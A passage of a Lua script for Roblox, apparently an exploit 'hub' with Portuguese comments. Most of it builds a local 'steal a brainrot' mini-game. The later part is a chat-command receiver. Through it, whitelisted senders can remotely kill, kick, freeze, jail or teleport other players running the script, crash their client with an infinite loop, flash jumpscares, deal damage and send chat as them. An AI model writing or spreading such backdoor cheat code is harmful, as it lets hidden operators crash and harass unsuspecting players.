        local function P(size, lx, ly, lz, color, mat, collide)
            return mk(f, size, F * CFrame.new(lx, ly, lz), color, mat, collide)
        end
        local halfW, halfD, H1 = BASE_W / 2, BASE_D / 2, 15

        P(Vector3.new(BASE_W + 6, 1, BASE_D + 6), 0, 0.5, 0, Color3.fromRGB(135, 138, 142), Enum.Material.Concrete)
        P(Vector3.new(BASE_W - 2, 0.4, BASE_D - 2), 0, 1.2, 0, Color3.fromRGB(200, 202, 206))
        P(Vector3.new(BASE_W, H1, 2), 0, 1 + H1 / 2, -halfD + 1, C_NAVY)
        P(Vector3.new(2, H1, BASE_D), -halfW + 1, 1 + H1 / 2, 0, C_NAVY)
        P(Vector3.new(2, H1, BASE_D), halfW - 1, 1 + H1 / 2, 0, C_NAVY)

        -- frente: pilares, janelas com moldura branca e porta no meio
        local fz = halfD - 1
        P(Vector3.new(6, H1, 2), -halfW + 3, 1 + H1 / 2, fz, C_STONE)
        P(Vector3.new(6, H1, 2), halfW - 3, 1 + H1 / 2, fz, C_STONE)
        local doorW = 12
        local segW = (BASE_W - 12 - doorW) / 2
        for _, sx in ipairs({ -1, 1 }) do
            local wx = sx * (doorW / 2 + segW / 2)
            P(Vector3.new(segW, 4, 2), wx, 3, fz, C_NAVY)
            local glass = P(Vector3.new(segW - 1, 7, 0.4), wx, 9, fz, C_GLASS, Enum.Material.Glass, false)
            glass.Transparency = 0.5
            P(Vector3.new(segW, 0.6, 2.4), wx, 12.6, fz, C_WHITE, Enum.Material.SmoothPlastic, false)
            P(Vector3.new(segW, 0.6, 2.4), wx, 5.4, fz, C_WHITE, Enum.Material.SmoothPlastic, false)
            P(Vector3.new(0.6, 7.2, 2.4), wx - segW / 2 + 0.3, 9, fz, C_WHITE, Enum.Material.SmoothPlastic, false)
            P(Vector3.new(0.6, 7.2, 2.4), wx + segW / 2 - 0.3, 9, fz, C_WHITE, Enum.Material.SmoothPlastic, false)
            P(Vector3.new(segW, H1 - 12.6, 2), wx, 1 + 12 + (H1 - 12) / 2 + 0.3, fz, C_NAVY)
            if red then
                for i = 0, 9 do
                    P(Vector3.new(0.5, 11, 0.5), wx - segW / 2 + 1 + i * ((segW - 2) / 9), 7.5, fz + 1.6, Color3.fromRGB(235, 40, 40), Enum.Material.SmoothPlastic, false)
                end
            end
        end
        P(Vector3.new(doorW, H1 - 10, 2), 0, 1 + 10 + (H1 - 10) / 2, fz, C_NAVY)

        -- teto e segundo andar
        P(Vector3.new(BASE_W + 2, 1.2, BASE_D + 2), 0, 1 + H1 + 0.6, 0, C_ROOF, Enum.Material.Slate)
        local UH = 12
        local upW, upD, upZ = BASE_W - 14, 34, -10
        local uy = 1 + H1 + 1.2
        P(Vector3.new(upW, UH, 2), 0, uy + UH / 2, upZ - upD / 2 + 1, C_NAVY)
        for _, sx in ipairs({ -1, 1 }) do
            P(Vector3.new(2, UH, upD), sx * (upW / 2 - 1), uy + UH / 2, upZ, C_NAVY)
        end
        P(Vector3.new(upW, 3, 2), 0, uy + 1.5, upZ + upD / 2 - 1, C_NAVY)
        P(Vector3.new(upW, 2, 2), 0, uy + UH - 1, upZ + upD / 2 - 1, C_NAVY)
        local ug = P(Vector3.new(upW - 2, UH - 5, 0.4), 0, uy + 3 + (UH - 5) / 2, upZ + upD / 2 - 1, C_GLASS, Enum.Material.Glass, false)
        ug.Transparency = 0.5
        P(Vector3.new(upW + 2, 1.2, upD + 2), 0, uy + UH + 0.6, upZ, C_ROOF, Enum.Material.Slate)

        -- escada externa até o terraço
        for i = 1, 15 do
            local h = i * 1.15
            P(Vector3.new(4, h, 2), halfW + 3, 1 + h / 2, halfD - 4 - (i - 1) * 2, Color3.fromRGB(125, 128, 134), Enum.Material.Concrete)
        end

        -- placa de madeira com o nome do dono
        local sign = P(Vector3.new(26, 5, 1), 0, 1 + H1 + 3.8, halfD + 0.5, C_WOOD, Enum.Material.Wood, false)
        textSurface(sign, Enum.NormalId.Back, { label .. "'s Base" }, Color3.fromRGB(255, 240, 220))

        -- espaços (pads) para os brainrots
        local slots = {}
        local look = F:VectorToWorldSpace(Vector3.new(0, 0, 1))
        for _, lz in ipairs({ -22, -6 }) do
            for _, lx in ipairs({ -21, -7, 7, 21 }) do
                P(Vector3.new(9, 0.2, 9), lx, 1.5, lz, C_WHITE, Enum.Material.SmoothPlastic, false)
                P(Vector3.new(8, 0.3, 8), lx, 1.6, lz, Color3.fromRGB(70, 200, 90), Enum.Material.SmoothPlastic, false)
                table.insert(slots, { pos = (F * CFrame.new(lx, 1.75, lz)).Position, look = look, model = nil })
            end
        end
        return { slots = slots, label = label }
    end

    ----------------------------------------------------------------
    -- BRAINROTS
    ----------------------------------------------------------------
    local function makeBrainrot(def, parent)
        local m = Instance.new("Model")
        m.Name = def.name
        local function part(sz, off, col)
            local p = Instance.new("Part")
            p.Anchored = true
            p.CanCollide = false
            p.Size = sz
            p.Color = col
            p.Material = Enum.Material.SmoothPlastic
            p.TopSurface = Enum.SurfaceType.Smooth
            p.BottomSurface = Enum.SurfaceType.Smooth
            p.CFrame = CFrame.new(off)
            p.Parent = m
            return p
        end
        local body = part(Vector3.new(3.2, 3.6, 2.2), Vector3.new(0, 3.2, 0), def.col)
        body.Name = "Body"
        local head = part(Vector3.new(3.4, 3, 3), Vector3.new(0, 5.9, 0), def.col2)
        head.Name = "Head"
        for _, sx in ipairs({ -0.8, 0.8 }) do
            part(Vector3.new(0.9, 0.9, 0.4), Vector3.new(sx, 6.2, -1.5), Color3.new(1, 1, 1))
            part(Vector3.new(0.4, 0.4, 0.2), Vector3.new(sx, 6.2, -1.78), Color3.new(0, 0, 0))
            part(Vector3.new(1, 2, 1), Vector3.new(sx, 1, 0), def.col2)
        end
        m.PrimaryPart = body

        local bb = Instance.new("BillboardGui")
        bb.Name = "Info"
        bb.Size = UDim2.new(0, 170, 0, 76)
        bb.StudsOffset = Vector3.new(0, 3.6, 0)
        bb.MaxDistance = 140
        bb.Adornee = head
        bb.Parent = head
        local function lab(name, text, color, y)
            local l = Instance.new("TextLabel")
            l.Name = name
            l.BackgroundTransparency = 1
            l.Size = UDim2.new(1, 0, 0.25, 0)
            l.Position = UDim2.new(0, 0, y, 0)
            l.Text = text
            l.TextColor3 = color
            l.TextStrokeTransparency = 0
            l.Font = Enum.Font.GothamBold
            l.TextScaled = true
            l.Parent = bb
        end
        lab("Name", def.name, Color3.new(1, 1, 1), 0)
        lab("Rarity", def.rarity, def.rc, 0.25)
        lab("Inc", "$" .. fmt(def.inc) .. "/s", Color3.fromRGB(90, 255, 110), 0.5)
        lab("Price", "$" .. fmt(def.price), Color3.fromRGB(255, 225, 80), 0.75)
        m.Parent = parent
        return m
    end

    local function setPrompt(model, action, hold, cb)
        local body = model.PrimaryPart
        local old = body:FindFirstChildOfClass("ProximityPrompt")
        if old then old:Destroy() end
        local pp = Instance.new("ProximityPrompt")
        pp.ActionText = action
        pp.ObjectText = model.Name
        pp.HoldDuration = hold
        pp.MaxActivationDistance = 12
        pp.RequiresLineOfSight = false
        pp.Parent = body
        pp.Triggered:Connect(cb)
        return pp
    end

    local function setPriceText(model, text)
        local head = model:FindFirstChild("Head")
        local bb = head and head:FindFirstChild("Info")
        local l = bb and bb:FindFirstChild("Price")
        if l then l.Text = text end
    end

    ----------------------------------------------------------------
    -- ESTADO / LÓGICA DO JOGO
    ----------------------------------------------------------------
    local function setMoney(S)
        if S.hudMoney then S.hudMoney.Text = "  $" .. fmt(S.money) end
        if S.hudInc then S.hudInc.Text = "  +$" .. fmt(S.income) .. "/s" end
    end

    local function freeSlot(slots)
        for _, s in ipairs(slots) do
            if not s.model then return s end
        end
    end

    local function placeModel(model, slot)
        local p = slot.pos + Vector3.new(0, 3.2, 0)
        model:PivotTo(CFrame.lookAt(p, p + slot.look))
    end

    local function claimMine(S, model, def, slot)
        slot.model = model
        slot.def = def
        placeModel(model, slot)
        S.income += def.inc
        setPriceText(model, "Seu  |  vender $" .. fmt(math.floor(def.price / 2)))
        setMoney(S)
        setPrompt(model, "Vender", 0.8, function()
            if slot.model ~= model then return end
            slot.model, slot.def = nil, nil
            S.money += math.floor(def.price / 2)
            S.income -= def.inc
            setMoney(S)
            model:Destroy()
        end)
    end

    local function putNpc(S, base, def, slot)
        local model = makeBrainrot(def, S.folder)
        slot.model = model
        slot.def = def
        placeModel(model, slot)
        setPriceText(model, "Dono: " .. base.label)
        setPrompt(model, "Roubar", 1.4, function()
            if slot.model ~= model then return end
            local mine = freeSlot(S.mySlots)
            if not mine then notify("Brainrot", "Sua base está cheia!") return end
            slot.model, slot.def = nil, nil
            claimMine(S, model, def, mine)
            notify("Brainrot", "Você roubou " .. def.name .. " de " .. base.label .. "!")
        end)
    end

    local function addWalker(S, z)
        local def = pickDef()
        local model = makeBrainrot(def, S.folder)
        local w = { model = model, def = def, x = math.random(-8, 8), z = z, t = math.random() * 10, gone = false }
        table.insert(S.walkers, w)
        setPrompt(model, "Comprar", 0.4, function()
            if w.gone then return end
            if S.money < def.price then
                notify("Brainrot", "Dinheiro insuficiente ($" .. fmt(def.price) .. ")")
                return
            end
            local slot = freeSlot(S.mySlots)
            if not slot then notify("Brainrot", "Sua base está cheia!") return end
            S.money -= def.price
            w.gone = true
            claimMine(S, model, def, slot)
        end)
    end

    local function makeHud(S)
        local pg = LocalPlayer:WaitForChild("PlayerGui")
        local sg = Instance.new("ScreenGui")
        sg.Name = "BrainrotHUD"
        sg.ResetOnSpawn = false
        sg.Parent = pg
        local function box(y, size, color)
            local l = Instance.new("TextLabel")
            l.Size = UDim2.new(0, 230, 0, y == 70 and 40 or 26)
            l.Position = UDim2.new(0, 12, 0, y)
            l.BackgroundColor3 = Color3.fromRGB(20, 20, 24)
            l.BackgroundTransparency = 0.3
            l.TextColor3 = color
            l.Font = Enum.Font.GothamBlack
            l.TextSize = size
            l.TextXAlignment = Enum.TextXAlignment.Left
            l.Parent = sg
            Instance.new("UICorner", l).CornerRadius = UDim.new(0, 8)
            return l
        end
        S.hudMoney = box(70, 24, Color3.fromRGB(90, 255, 110))
        S.hudInc = box(114, 16, Color3.fromRGB(255, 225, 80))
        S.gui = sg
        setMoney(S)
    end

    ----------------------------------------------------------------
    -- API
    ----------------------------------------------------------------
    function BRAIN.clear(silent)
        BRAIN.token += 1
        local S = BRAIN.S
        BRAIN.S = nil
        if S then
            if S.conn then pcall(function() S.conn:Disconnect() end) end
            if S.charConn then pcall(function() S.charConn:Disconnect() end) end
            if S.folder then pcall(function() S.folder:Destroy() end) end
            if S.gui then pcall(function() S.gui:Destroy() end) end
        end
        for _, n in ipairs({ "BR_Sky", "BR_CC" }) do
            local o = Lighting:FindFirstChild(n)
            if o then o:Destroy() end
        end
        for _, a in ipairs(BRAIN.hidden) do
            pcall(function() a.Parent = Lighting end)
        end
        BRAIN.hidden = {}
        local sv = BRAIN.saved
        BRAIN.saved = nil
        if sv then
            for k, v in pairs(sv) do pcall(function() Lighting[k] = v end) end
        end
        if S and not silent then notify("Brainrot", "Mundo removido.") end
        return true
    end

    function BRAIN.spawn()
        notify("Brainrot", "Gerando o mundo...")
        BRAIN.clear(true)
        pcall(POOL.clear, true)
        if workspace:FindFirstChild("Backrooms_Level0") then pcall(clearBackrooms) end
        BRAIN.count = 0
        local myToken = BRAIN.token

        local S = { money = 500, income = 0, walkers = {}, mySlots = {}, npcBases = {} }
        BRAIN.S = S
        local f = Instance.new("Folder")
        f.Name = "RoubeUmBrainrot_World"
        f.Parent = workspace
        S.folder = f

        -- céu e luz de dia
        BRAIN.saved = {}
        for _, k in ipairs(LIGHT_PROPS) do pcall(function() BRAIN.saved[k] = Lighting[k] end) end
        local function set(k, v) pcall(function() Lighting[k] = v end) end
        set("ClockTime", 14)
        set("Brightness", 2.4)
        set("Ambient", Color3.fromRGB(150, 150, 150))
        set("OutdoorAmbient", Color3.fromRGB(160, 160, 160))
        set("FogStart", 0)
        set("FogEnd", 100000)
        set("GlobalShadows", true)
        set("ExposureCompensation", 0)
        pcall(function()
            for _, c in ipairs(Lighting:GetChildren()) do
                if c:IsA("Atmosphere") or c:IsA("Sky") then
                    table.insert(BRAIN.hidden, c)
                    c.Parent = nil
                end
            end
        end)
        pcall(function()
            local sky = Instance.new("Sky")
            sky.Name = "BR_Sky"
            sky.Parent = Lighting
            local cc = Instance.new("ColorCorrectionEffect")
            cc.Name = "BR_CC"
            cc.Saturation = 0.12
            cc.Contrast = 0.04
            cc.Parent = Lighting
        end)

        buildTerrain(f)
        if BRAIN.token ~= myToken then return end

        -- 8 bases: esquerda (olha pra +X) e direita (olha pra -X); a 1ª da esquerda perto do portão sul é a SUA
        local names = {}
        local ni = 0
        local idx = 0
        for _, side in ipairs({ -1, 1 }) do
            for _, bz in ipairs(BASE_Z) do
                idx += 1
                local label
                if idx == 1 then
                    label = LocalPlayer.DisplayName
                else
                    ni += 1
                    label = NPC_NAMES[ni] or ("Player" .. ni)
                end
                local base = buildBase(f, side * BASE_X, bz, side, label, idx % 2 == 0)
                if idx == 1 then
                    S.mySlots = base.slots
                else
                    table.insert(S.npcBases, base)
                end
                names[idx] = base
                if BRAIN.token ~= myToken then return end
            end
        end

        makeHud(S)

        -- bases dos outros já com brainrots (pra roubar)
        for _, base in ipairs(S.npcBases) do
            for i = 1, math.random(2, 3) do
                local slot = freeSlot(base.slots)
                if slot then putNpc(S, base, pickDef(4), slot) end
            end
        end

        -- brainrots andando pelo tapete (do portão norte pro sul)
        for i = 0, 5 do
            addWalker(S, -L / 2 + 20 + i * 60)
        end

        -- teleporte
        local startPos = Vector3.new(0, GY + 4, L / 2 - 20)
        local startCF = CFrame.lookAt(startPos, Vector3.new(0, GY + 4, 0))
        local function teleportMe()
            local chr = LocalPlayer.Character
            local hrp = chr and chr:FindFirstChild("HumanoidRootPart")
            if hrp then
                hrp.Anchored = true
                hrp.CFrame = startCF
                task.wait(0.3)
                hrp.Anchored = false
            end
        end
        teleportMe()
        S.charConn = LocalPlayer.CharacterAdded:Connect(function(c)
            local h = c:WaitForChild("HumanoidRootPart", 10)
            if h and BRAIN.token == myToken then
                task.wait(0.5)
                h.CFrame = startCF
            end
        end)

        -- movimento dos brainrots no tapete
        S.conn = RunService.Heartbeat:Connect(function(dt)
            for i = #S.walkers, 1, -1 do
                local w = S.walkers[i]
                if w.gone then
                    table.remove(S.walkers, i)
                else
                    w.z += WALK_SPEED * dt
                    w.t += dt
                    if w.z > L / 2 - 10 then
                        w.gone = true
                        w.model:Destroy()
                        table.remove(S.walkers, i)
                    else
                        local bob = math.abs(math.sin(w.t * 8)) * 0.4
                        local p = Vector3.new(w.x, FEET + 3.2 + bob, w.z)
                        w.model:PivotTo(CFrame.lookAt(p, p + Vector3.new(0, 0, 1)))
                    end
                end
            end
        end)

        -- renda por segundo, novos brainrots no tapete e reposição nas bases dos outros
        task.spawn(function()
            local tick1, tick2, tick3 = 0, 0, 0
            while BRAIN.token == myToken do
                task.wait(1)
                tick1 += 1
                tick2 += 1
                tick3 += 1
                S.money += S.income
                setMoney(S)
                if tick2 >= 4 then
                    tick2 = 0
                    if #S.walkers < 10 then addWalker(S, -L / 2 + 14) end
                end
                if tick3 >= 20 then
                    tick3 = 0
                    local base = S.npcBases[math.random(#S.npcBases)]
                    local slot = base and freeSlot(base.slots)
                    if slot then putNpc(S, base, pickDef(4), slot) end
                end
            end
        end)

        notify("Brainrot", "Pronto! Segure E nos brainrots para comprar/roubar.")
        return true
    end
end

local function roubeUmBrainrot(modo)
    modo = modo and string.upper(modo) or (BRAIN.S and "OFF" or "ON")
    if modo == "OFF" then BRAIN.clear() else BRAIN.spawn() end
end

-- ================== RECEPTOR ==================
function executeActionLocally(action, senderName, extraArg)
    local char = LocalPlayer.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    local hum = char and char:FindFirstChildOfClass("Humanoid")

    if action == "KILL" and hum then hum.Health = 0
    elseif action == "KICK" then LocalPlayer:Kick("Expulso pelo Fantasma1l Hub.")
    elseif action == "FREEZE" and hrp and hum then hrp.Anchored, hum.WalkSpeed, hum.JumpPower = true, 0, 0
    elseif action == "UNFREEZE" and hrp and hum then hrp.Anchored, hum.WalkSpeed, hum.JumpPower = false, 16, 50
    elseif action == "CRASH" then while true do end
    elseif action == "EXPLODE" and hrp then
        Instance.new("Explosion", workspace).Position = hrp.Position
        if hum then hum.Health = 0 end
    elseif action == "ICE" and hrp then
        if workspace:FindFirstChild("Ice_" .. LocalPlayer.Name) then workspace["Ice_" .. LocalPlayer.Name]:Destroy() end
        local ip = Instance.new("Part", workspace)
        ip.Name, ip.Size, ip.CFrame = "Ice_" .. LocalPlayer.Name, Vector3.new(6, 8, 6), hrp.CFrame
        ip.Anchored, ip.CanCollide = true, false
        ip.Color, ip.Material, ip.Transparency = Color3.fromRGB(0, 170, 255), Enum.Material.Glass, 0.4
        if hum then hum.WalkSpeed = 0 end
        hrp.Anchored = true
    elseif action == "UNICE" and hrp then
        if workspace:FindFirstChild("Ice_" .. LocalPlayer.Name) then workspace["Ice_" .. LocalPlayer.Name]:Destroy() end
        if hum then hum.WalkSpeed = 16 end
        hrp.Anchored = false
    elseif action == "JAIL" and extraArg then
        local targetPlr = Players:FindFirstChild(extraArg)
        if targetPlr and targetPlr.Character and targetPlr.Character:FindFirstChild("HumanoidRootPart") then
            local thrp = targetPlr.Character.HumanoidRootPart
            if workspace:FindFirstChild("Jail_" .. targetPlr.Name) then
                workspace["Jail_" .. targetPlr.Name]:Destroy()
            end
            local cage = Instance.new("Model", workspace)
            cage.Name = "Jail_" .. targetPlr.Name
            local cf = thrp.CFrame
            for _, d in ipairs({
                {Vector3.new(6,1,6), cf * CFrame.new(0,-3.5,0)},
                {Vector3.new(6,1,6), cf * CFrame.new(0, 3.5,0)},
                {Vector3.new(1,6,6), cf * CFrame.new( 3,0,0)},
                {Vector3.new(1,6,6), cf * CFrame.new(-3,0,0)},
                {Vector3.new(6,6,1), cf * CFrame.new(0,0, 3)},
                {Vector3.new(6,6,1), cf * CFrame.new(0,0,-3)},
            }) do
                local p = Instance.new("Part", cage)
                p.Size, p.CFrame = d[1], d[2]
                p.Color, p.Material = Color3.fromRGB(168, 85, 247), Enum.Material.Neon
                p.Anchored, p.Transparency = true, 0.3
            end
        end
    elseif action == "UNJAIL" and extraArg then
        if workspace:FindFirstChild("Jail_" .. extraArg) then
            workspace["Jail_" .. extraArg]:Destroy()
        end
    elseif action == "TP_TO_POS" and hrp and senderName then
        local sp = Players:FindFirstChild(senderName)
        if sp and sp.Character and sp.Character:FindFirstChild("HumanoidRootPart") then
            hrp.CFrame = sp.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -3)
        end
    elseif action == "TP_ME" and hrp and senderName then
        local sp = Players:FindFirstChild(senderName)
        if sp and sp.Character and sp.Character:FindFirstChild("HumanoidRootPart") then
            sp.Character.HumanoidRootPart.CFrame = hrp.CFrame * CFrame.new(0, 0, -3)
        end
    elseif action == "VISIBLE" and char then
        for _, p in ipairs(char:GetDescendants()) do
            if p:IsA("BasePart") then p.Transparency = 0 p.LocalTransparencyModifier = 0 end
        end
    elseif action == "CHAT_AS" and extraArg then sendNetCmd(extraArg)
    elseif action == "COOLKID_EFFECT" then
        task.spawn(function() pcall(executeCoolkidEffect) end)
    elseif action == "BACKROOMS_SPAWN" then
        task.spawn(function() pcall(POOL.clear, true) pcall(function() spawnBackrooms(extraArg) end) end)
    elseif action == "POOLROOMS_SPAWN" then
        task.spawn(function() pcall(function() POOL.spawn(extraArg) end) end)
    elseif action == "POOLROOMS_CLEAR" then
        task.spawn(function() pcall(POOL.clear) end)
    elseif action == "BACKROOMS_CLEAR" then task.spawn(function() pcall(clearBackrooms) end)
    elseif action == "LIFEFORM_SPAWN" then
        task.spawn(function()
            local folder = workspace:FindFirstChild("Backrooms_Level0")
            if not folder then
                pcall(function() spawnBackrooms(extraArg) end)
                task.wait(3)
                folder = workspace:FindFirstChild("Backrooms_Level0")
            end
            if folder then
                local targetP = Players:FindFirstChild(extraArg or selectedPlayerName) or LocalPlayer
                local chr = targetP.Character
                local hrp2 = chr and chr:FindFirstChild("HumanoidRootPart")
                local pos = hrp2 and (hrp2.Position + Vector3.new(30, 0, 30)) or Vector3.new(30, 203, 30)
                pcall(function() spawnLifeform(pos, folder, targetP.Name) end)
            end
        end)
    elseif action == "LIFEFORM_CLEAR" then
        task.spawn(function() pcall(clearLifeform) end)
    elseif action == "LOCUST_ON" then
        task.spawn(function() pcall(LOCUST.start) end)
    elseif action == "LOCUST_OFF" then
        task.spawn(function() pcall(LOCUST.stop) end)
    elseif action == "XESTER_ON" then
        task.spawn(function() pcall(XESTER.start) end)
    elseif action == "XESTER_OFF" then
        task.spawn(function() pcall(XESTER.stop) end)
    elseif action == "BRAINROT_SPAWN" then
        task.spawn(function() pcall(roubeUmBrainrot, "ON") end)
    elseif action == "BRAINROT_CLEAR" then
        task.spawn(function() pcall(roubeUmBrainrot, "OFF") end)
    -- >>> FLASH & AURA (REDE) <<<
    elseif FXNET.actions[action] then
        FXNET.run(action, extraArg)
    elseif action == "KAMUI" then
        task.spawn(function()
            local pg = LocalPlayer:WaitForChild("PlayerGui")
            local sg = Instance.new("ScreenGui", pg)
            sg.Name, sg.IgnoreGuiInset, sg.ResetOnSpawn = "KamuiEffect", true, false
            local img = Instance.new("ImageLabel", sg)
            img.Size, img.AnchorPoint, img.Position = UDim2.new(0, 320, 0, 320), Vector2.new(0.5, 0.5), UDim2.new(0.5, 0, 0.5, 0)
            img.BackgroundTransparency, img.Image, img.ScaleType = 1, KAMUI_IMG, Enum.ScaleType.Fit
            local s = Instance.new("Sound", workspace)
            s.SoundId, s.Volume = KAMUI_SND, 6
            s:Play()
            local start = tick()
            local conn
            conn = RunService.RenderStepped:Connect(function()
                if tick() - start < 3.5 then img.Rotation = (tick() - start) * 350
                else conn:Disconnect() end
            end)
            task.wait(3.5)
            if sg then sg:Destroy() end
            if s then s:Destroy() end
            if not kamuiEnabled then toggleKamuiDimensionLocal(true)
            else
                local pf = workspace:FindFirstChild("KamuiDimensionBox") and workspace.KamuiDimensionBox:FindFirstChild("KamuiTargetPlatform")
                if hrp and pf then hrp.CFrame = pf.CFrame + Vector3.new(0, 6, 0) end
            end
        end)
    elseif action == "MEME_FACE" and extraArg then
        local id = getRealImageIdDelta(MEMES[extraArg] or extraArg)
        for _, p in pairs(Players:GetPlayers()) do
            local h = p.Character and p.Character:FindFirstChild("Head")
            if h then
                local f = h:FindFirstChild("face") or h:FindFirstChildOfClass("Decal")
                if f then f.Transparency = 1 end
                local old = h:FindFirstChild("MemeFaceGigante")
                if old then old:Destroy() end
                local bb = Instance.new("BillboardGui", h)
                bb.Name, bb.Size, bb.StudsOffset, bb.AlwaysOnTop = "MemeFaceGigante", UDim2.new(4.5,0,4.5,0), Vector3.new(0,0.5,0), true
                local im = Instance.new("ImageLabel", bb)
                im.Size, im.BackgroundTransparency = UDim2.new(1,0,1,0), 1
                im.Image, im.ScaleType = id, Enum.ScaleType.Fit
            end
        end
    elseif action == "SUKUNA_DOMAIN" and senderName then
        local sp = Players:FindFirstChild(senderName)
        local sc = sp and sp.Character
        local sh = sc and sc:FindFirstChild("HumanoidRootPart")
        if not sh then return end
        task.spawn(function()
            local s = Instance.new("Sound", sh)
            s.SoundId, s.Volume = SUK_AUDIO, 5
            s:Play()
            s.Ended:Connect(function() s:Destroy() end)
            local rp = RaycastParams.new()
            rp.FilterDescendantsInstances, rp.FilterType = {sc}, Enum.RaycastFilterType.Exclude
            local rr = workspace:Raycast(sh.Position + Vector3.new(0,50,0), Vector3.new(0,-200,0), rp)
            local gy = rr and rr.Position.Y or sh.Position.Y
            local tb = sh.CFrame * CFrame.new(0, 0, 10)
            local shrine = fetchAssetAsModel(SUK_SHRINE)
            if shrine then
                shrine.Parent = workspace
                pcall(function() shrine:ScaleTo(5.5) end)
                for _, p in ipairs(shrine:GetDescendants()) do
                    if p:IsA("BasePart") then p.Anchored, p.CanCollide = true, false end
                end
                local bcf, bs = shrine:GetBoundingBox()
                local bo = shrine:GetPivot().Position.Y - (bcf.Position.Y - (bs.Y / 2))
                local tcf = CFrame.new(tb.X, gy + bo + SHRINE_Y, tb.Z) * sh.CFrame.Rotation
                local scf = tcf * CFrame.new(0, -35, 0)
                shrine:PivotTo(scf)
                for i = 1, 50 do
                    local a = i / 50
                    shrine:PivotTo(scf:Lerp(tcf, a * a * (3 - 2 * a)))
                    task.wait(0.015)
                end
                shrine:PivotTo(tcf)
                local st, dur = tick(), 15
                while tick() - st < dur and shrine and shrine.Parent do
                    for _ = 1, 6 do
                        task.spawn(function()
                            local cm = fetchAssetAsModel(SUK_CUTS)
                            if cm then
                                pcall(function() cm:ScaleTo(4.5) end)
                                for _, p in ipairs(cm:GetDescendants()) do
                                    if p:IsA("BasePart") then p.Anchored, p.CanCollide = true, false end
                                end
                                local off = Vector3.new(math.random(-35,35), math.random(-5,20), math.random(-35,35))
                                local rot = CFrame.Angles(math.rad(math.random(360)), math.rad(math.random(360)), math.rad(math.random(360)))
                                cm:PivotTo(sh.CFrame * CFrame.new(off) * rot)
                                cm.Parent = workspace
                                task.delay(0.1, function() if cm then cm:Destroy() end end)
                            end
                        end)
                    end
                    if hrp and hum and (hrp.Position - sh.Position).Magnitude <= 140 then
                        hum:TakeDamage(10)
                    end
                    task.wait(0.03)
                end
                if shrine then shrine:Destroy() end
            end
        end)
    elseif action == "TACO_RAIN" then
        task.spawn(function()
            for _ = 1, 15 do
                local m = fetchAssetAsModel(TACO_ID)
                if m then
                    for _, p in ipairs(m:GetDescendants()) do
                        if p:IsA("BasePart") then p.Anchored, p.CanCollide = false, false end
                    end
                    pcall(function() m:ScaleTo(12) end)
                    m:PivotTo(CFrame.new(math.random(-200,200), 150, math.random(-200,200)))
                    m.Parent = workspace
                    makeModelFallSlowly(m)
                    task.delay(12, function() if m and m.Parent then m:Destroy() end end)
                end
                task.wait(0.4)
            end
        end)
    elseif action == "RENEGADO_RAIN" then
        task.spawn(function()
            local ok, uid = pcall(function() return Players:GetUserIdFromNameAsync("renegado6661l") end)
            if ok and uid then
                local sok, desc = pcall(function() return Players:GetHumanoidDescriptionFromUserId(uid) end)
                if sok and desc then
                    for _ = 1, 10 do
                        local cm = Players:CreateHumanoidModelFromDescription(desc, Enum.HumanoidRigType.R6)
                        for _, p in ipairs(cm:GetDescendants()) do
                            if p:IsA("BasePart") then p.Anchored, p.CanCollide = false, true end
                        end
                        cm:PivotTo(CFrame.new(math.random(-200,200), 150, math.random(-200,200)))
                        cm.Parent = workspace
                        makeModelFallSlowly(cm)
                        task.delay(10, function() if cm and cm.Parent then cm:Destroy() end end)
                        task.wait(0.5)
                    end
                end
            end
        end)
    elseif action:find("JUMPSCARE_") then
        local data = JUMPS[action] or JUMPS["JUMPSCARE_1"]
        task.spawn(function()
            local pg = LocalPlayer:WaitForChild("PlayerGui")
            local old = pg:FindFirstChild("Screamer")
            if old then old:Destroy() end
            local ng = Instance.new("ScreenGui", pg)
            ng.Name, ng.IgnoreGuiInset, ng.ResetOnSpawn = "Screamer", true, false
            local im = Instance.new("ImageLabel", ng)
            im.Size, im.BackgroundTransparency = UDim2.new(1,0,1,0), 1
            im.Image, im.ScaleType = data.Img, Enum.ScaleType.Crop
            local s = Instance.new("Sound", ng)
            s.SoundId, s.Volume = data.Snd, 10
            s:Play()
            local st = tick()
            while tick() - st < 2.5 do
                if not im.Parent then break end
                im.Position = UDim2.new(0, math.random(-25,25), 0, math.random(-25,25))
                im.Rotation = math.random(-3,3)
                task.wait(0.04)
            end
            task.wait(0.3)
            ng:Destroy()
        end)
    end
end

-- ================== REDE (PREFIXO ;) ==================
-- Formato: ;ACAO ALVO [EXTRA]   ex.: ;KILL Fulano   ;FLASH_ON ALL   (também aceita "fhub ACAO ALVO")
local recentNet = {}
local function isMe(t)
    if not t then return false end
    local l = string.lower(t)
    return l == string.lower(LocalPlayer.Name) or l == string.lower(LocalPlayer.DisplayName)
end

function processNetMessage(msg, senderName)
    if not msg then return end
    -- evita executar 2x a mesma mensagem (chat novo + antigo disparam os dois)
    do
        local now = os.clock()
        local key = tostring(senderName) .. ":" .. msg
        if recentNet[key] and now - recentNet[key] < 1.5 then return end
        recentNet[key] = now
        for k, t in pairs(recentNet) do
            if now - t > 5 then recentNet[k] = nil end
        end
    end
    local body
    if msg:sub(1, 1) == ";" then
        body = msg:sub(2)
    elseif string.lower(msg:sub(1, 5)) == "fhub " then
        body = msg:sub(6)
    else
        return
    end
    local parts = string.split(body, " ")
    if #parts < 1 or parts[1] == "" then return end

    local action = string.upper(parts[1])
    local target = parts[2]
    local extraArg = parts[3] and table.concat(parts, " ", 3) or nil

    if action == "PING" then
        local role = (WHITELIST[LocalPlayer.Name] and WHITELIST[LocalPlayer.Name].Role) or "USER"
        sendNetCmd(";PONG " .. LocalPlayer.Name .. " ROLE_" .. role)
    elseif action == "PONG" and target then
        activeScriptUsers[target] = true
        local roleExtra = parts[3] or "ROLE_USER"
        NETWORK_ROLES[target] = roleExtra:gsub("ROLE_", "")
        local pt = Players:FindFirstChild(target)
        if pt and IS_ADMIN then applyOverheadTag(pt) end
    end

    -- estado do Locust: só vale se o próprio jogador anunciar o seu (não dá pra forjar o de outro)
    if action == "LOCUST_STATE" then
        if target and senderName == target then
            LOCUST.setUser(target, extraArg == "ON")
        end
        return
    end
    if action == "XESTER_STATE" then
        if target and senderName == target then
            XESTER.setUser(target, extraArg == "ON")
        end
        return
    end

    -- >>> FLASH & AURA (REDE): todo cliente do hub desenha o efeito no personagem do alvo <<<
    -- Segurança: comandos só valem se vierem de você ou de alguém da WHITELIST
    if action ~= "PING" and action ~= "PONG" then
